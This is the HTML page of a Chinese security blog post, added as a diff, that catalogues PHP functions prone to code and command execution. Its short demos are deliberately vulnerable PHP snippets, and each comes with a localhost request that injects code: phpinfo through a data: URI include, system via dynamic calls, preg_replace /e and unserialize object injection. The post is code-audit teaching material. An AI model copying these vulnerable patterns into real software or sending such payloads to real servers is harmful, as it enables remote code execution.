@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                PHP中容易产生命令执行漏洞的那些函数 |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">PHP中容易产生命令执行漏洞的那些函数</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2016-10-10 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>779 Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>3 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h3 id="一-代码执行函数"><a href="#一-代码执行函数" class="headerlink" title="一 代码执行函数"></a>一 代码执行函数</h3><p>PHP中可以执行代码的函数。如<code>eval()、assert()、``、system()、exec()、shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec() </code>等</p>
+<p>demo </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo `dir`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二-文件包含代码注射"><a href="#二-文件包含代码注射" class="headerlink" title="二 文件包含代码注射"></a>二 文件包含代码注射</h3><p>文件包含函数在特定条件下的代码注射，如<code>include()、include_once()、 require()、require_once()</code>。</p>
+<p>当<code>allow_url_include=On</code> ，<code>PHP Version&gt;=5.2.0</code> 时，导致代码注射。</p>
+<p>demo </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://127.0.0.1/include.php?a=data:text/plain,%3C?php%20phpinfo%28%29;?%3E </code>即<br>执行<code>phpinfo()</code></p>
+<h3 id="三-正则匹配代码注射"><a href="#三-正则匹配代码注射" class="headerlink" title="三 正则匹配代码注射"></a>三 正则匹配代码注射</h3><p>众所周知的<code>preg_replace()</code>函数导致的代码注射。当<code>pattern</code>中存在/e模式修饰符，即允许执行代码。这里我们分三种情况讨论下</p>
+<h4 id="3-1-preg-replace-pattern-参数注射"><a href="#3-1-preg-replace-pattern-参数注射" class="headerlink" title="3.1 preg_replace() pattern 参数注射"></a>3.1 <code>preg_replace() pattern</code> 参数注射</h4><p>pattern即第一个参数的代码注射。<br>当<code>magic_quotes_gpc=Off</code>时，导致代码执行。</p>
+<p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $regexp = $_GET[&#x27;reg&#x27;];</span><br><span class="line">$var = &#x27;&lt;php&gt;phpinfo()&lt;/php&gt;&#x27;;</span><br><span class="line">preg_replace(&quot;/&lt;php&gt;(.*?)$regexp&quot;, &#x27;\\1&#x27;, $var);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://127.0.0.1/preg_replace1.php?reg=%3C\/php%3E/e</code> 即<br>执行<code>phpinfo()</code></p>
+<h4 id="3-2-preg-replace-replacement参数注射"><a href="#3-2-preg-replace-replacement参数注射" class="headerlink" title="3.2 preg_replace() replacement参数注射"></a>3.2 <code>preg_replace() replacement</code>参数注射</h4><p>replacement即第二个参数的代码注射，导致代码执行。</p>
+<p>demo </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">preg_replace(&quot;/test/e&quot;,$_GET[&#x27;h&#x27;],&quot;jutst test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当我们提交 <a class="link" target="_blank" rel="noopener" href="http://127.0.0.1/preg_replace2.php?h=phpinfo()">http://127.0.0.1/preg_replace2.php?h=phpinfo()<i class="fas fa-external-link-alt"></i></a> 即<br>执行phpinfo()。</p>
+<h4 id="3-3-preg-replace-第三个参数注射"><a href="#3-3-preg-replace-第三个参数注射" class="headerlink" title="3.3 preg_replace()第三个参数注射"></a>3.3 <code>preg_replace()</code>第三个参数注射</h4><p>我们通过构造subject参数执行代码。提交：<code>http://127.0.0.1/preg_replace3.php?h=[php]phpinfo()[/php]</code></p>
+<p>或者 <code>http://127.0.0.1/preg_replace3.php?h=[php]$&#123;phpinfo%28%29&#125;[/php]</code> 导致代码执行</p>
+<p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">preg_replace(&quot;/\s*\[php\](.+?)\[\/php\]\s*/ies&quot;, &quot;\\1&quot;, $_GET[&#x27;h&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="四-动态代码执行"><a href="#四-动态代码执行" class="headerlink" title="四 动态代码执行"></a>四 动态代码执行</h3><h4 id="4-1-动态变量代码执行"><a href="#4-1-动态变量代码执行" class="headerlink" title="4.1 动态变量代码执行"></a>4.1 动态变量代码执行</h4><p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dyn_func = $_GET[&#x27;dyn_func&#x27;];</span><br><span class="line">$argument = $_GET[&#x27;argument&#x27;];</span><br><span class="line">$dyn_func($argument);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们提交 <code>http://127.0.0.1/dyn_func.php?dyn_func=system&amp;argument=ipconfig</code> 执行ipconfig命令</p>
+<h4 id="4-2-动态函数代码执行"><a href="#4-2-动态函数代码执行" class="headerlink" title="4.2 动态函数代码执行"></a>4.2 动态函数代码执行</h4><p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre lang=&quot;php&quot; file=&quot;demo42.php&quot; colla=&quot;+&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$foobar = $_GET[&#x27;foobar&#x27;];</span><br><span class="line">$dyn_func = create_function(&#x27;$foobar&#x27;, &quot;echo $foobar;&quot;);</span><br><span class="line">$dyn_func(&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们提交 <code>http://127.0.0.1/create_function.php?foobar=system%28dir%29</code> 执行dir命令</p>
+<h3 id="五-其他"><a href="#五-其他" class="headerlink" title="五 其他"></a>五 其他</h3><h4 id="5-1-ob-start-函数的代码执行"><a href="#5-1-ob-start-函数的代码执行" class="headerlink" title="5.1 ob_start()函数的代码执行"></a>5.1 ob_start()函数的代码执行</h4><p>demo code 5.1:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre lang=&quot;php&quot; file=&quot;demo51.php&quot; colla=&quot;+&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$foobar = &#x27;system&#x27;;</span><br><span class="line">ob_start($foobar);</span><br><span class="line">echo &#x27;dir&#x27;;</span><br><span class="line">ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="5-2-array-map-函数的代码执行"><a href="#5-2-array-map-函数的代码执行" class="headerlink" title="5.2 array_map()函数的代码执行"></a>5.2 <code>array_map()</code>函数的代码执行</h4><p>demo </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre lang=&quot;php&quot; file=&quot;demo52.php&quot; colla=&quot;+&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$evil_callback = $_GET[&#x27;callback&#x27;];</span><br><span class="line">$some_array = array(0, 1, 2, 3);</span><br><span class="line">$new_array = array_map($evil_callback, $some_array);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<p>我们提交 <code>http://127.0.0.1/array_map.php?callback=phpinfo</code> 即执行<code>phpinfo()</code></p>
+<h4 id="5-3-unserialize-与eval"><a href="#5-3-unserialize-与eval" class="headerlink" title="5.3 unserialize()与eval()"></a>5.3 <code>unserialize()</code>与<code>eval()</code></h4><p><code>unserialize（）</code>是PHP中使用率非常高的函数。不正当使用<code>unserialize（）</code>容易导致安全隐患。</p>
+<p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre lang=&quot;php&quot; file=&quot;demo53.php&quot; colla=&quot;+&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class Example &#123;</span><br><span class="line">var $var = &#x27;&#x27;;</span><br><span class="line">function __destruct() &#123;</span><br><span class="line">eval($this-&gt;var);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;saved_code&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<p>我们提交 <code>http://127.0.0.1/unserialize.php?saved_code=O:7:%22Example%22:1:&#123;s:3:%22var%22;s:10:%22phpinfo%28%29;%22;&#125;</code> 即执行<code>phpinfo()</code></p>
+<h4 id="5-4-容易导致安全问题的函数"><a href="#5-4-容易导致安全问题的函数" class="headerlink" title="5.4 容易导致安全问题的函数"></a>5.4 容易导致安全问题的函数</h4><p>同类型函数还有很多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">array_map()</span><br><span class="line">usort(), uasort(), uksort()</span><br><span class="line">array_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">array_diff_uassoc(), array_diff_ukey()</span><br><span class="line">array_udiff(), array_udiff_assoc(), array_udiff_uassoc()</span><br><span class="line">array_intersect_assoc(), array_intersect_uassoc()</span><br><span class="line">array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()</span><br><span class="line">array_walk(), array_walk_recursive()</span><br><span class="line">xml_set_character_data_handler()</span><br><span class="line">xml_set_default_handler()</span><br><span class="line">xml_set_element_handler()</span><br><span class="line">xml_set_end_namespace_decl_handler()</span><br><span class="line">xml_set_external_entity_ref_handler()</span><br><span class="line">xml_set_notation_decl_handler()</span><br><span class="line">xml_set_processing_instruction_handler()</span><br><span class="line">xml_set_start_namespace_decl_handler()</span><br><span class="line">xml_set_unparsed_entity_decl_handler()</span><br><span class="line">stream_filter_register()</span><br><span class="line">set_error_handler()</span><br><span class="line">register_shutdown_function()</span><br><span class="line">register_tick_function()</span><br></pre></td></tr></table></figure>
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：PHP中容易产生命令执行漏洞的那些函数</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2016-10-10 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/PHP中容易产生命令执行漏洞的那些函数/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/Joomla!%203.7%20(CVE-2017-8917)%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Joomla! 3.7 (CVE-2017-8917) 代码分析</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/XSS%E5%88%A9%E7%94%A8%E4%B9%8BCookie%20/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XSS利用之Cookie</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-text">一 代码执行函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%B0%84"><span class="nav-text">二 文件包含代码注射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%B0%84"><span class="nav-text">三 正则匹配代码注射</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-preg-replace-pattern-%E5%8F%82%E6%95%B0%E6%B3%A8%E5%B0%84"><span class="nav-text">3.1 preg_replace() pattern 参数注射</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-preg-replace-replacement%E5%8F%82%E6%95%B0%E6%B3%A8%E5%B0%84"><span class="nav-text">3.2 preg_replace() replacement参数注射</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-preg-replace-%E7%AC%AC%E4%B8%89%E4%B8%AA%E5%8F%82%E6%95%B0%E6%B3%A8%E5%B0%84"><span class="nav-text">3.3 preg_replace()第三个参数注射</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">四 动态代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">4.1 动态变量代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">4.2 动态函数代码执行</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94-%E5%85%B6%E4%BB%96"><span class="nav-text">五 其他</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-ob-start-%E5%87%BD%E6%95%B0%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">5.1 ob_start()函数的代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-array-map-%E5%87%BD%E6%95%B0%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">5.2 array_map()函数的代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-3-unserialize-%E4%B8%8Eeval"><span class="nav-text">5.3 unserialize()与eval()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-4-%E5%AE%B9%E6%98%93%E5%AF%BC%E8%87%B4%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">5.4 容易导致安全问题的函数</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
